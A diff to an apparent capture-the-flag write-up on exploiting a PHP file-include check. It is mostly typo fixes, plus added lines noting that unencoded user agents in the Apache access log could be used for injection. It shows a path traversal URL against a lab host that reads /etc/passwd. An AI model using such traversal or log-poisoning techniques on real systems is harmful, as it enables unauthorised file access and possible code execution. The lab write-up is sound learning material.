@@ -87,13 +87,13 @@ Inspecting the code we find the following check: <br/>
 if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
 ```
 
-So this seems t ocheck if I either enter dog or cat. Meaning I must include at least 1 of those 2. <br/>
+So this seems to check if I either enter dog or cat. Meaning I must include at least 1 of those 2. <br/>
 After the check comes out as true the following function is being executed. <br/>
 ```php
 include $_GET['view'] . $ext;
 ```
 
-this basically gets the file to view wit hthe extension being set via the variable `$ext`. <br/>
+This basically gets the file to view with the extension being set via the variable `$ext`. <br/>
 Now knowing all the parameters we can simply implement all of those into our path traversal exploit. <br/>
 ```
 http://10.10.219.26/?view=?dog/../../../../etc/passwd&ext=
@@ -122,4 +122,7 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/no
 ```
 
 After poking around a bit I also found the file `/var/log/apache2/access.log`. <br/>
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/44f84c81-be23-492c-9630-e99f08b17379)
 
+Looking at the access logs we can see that the user agent is logged additionally without being URL encoded. <br/>
+Now this may be used to upload malicious content.
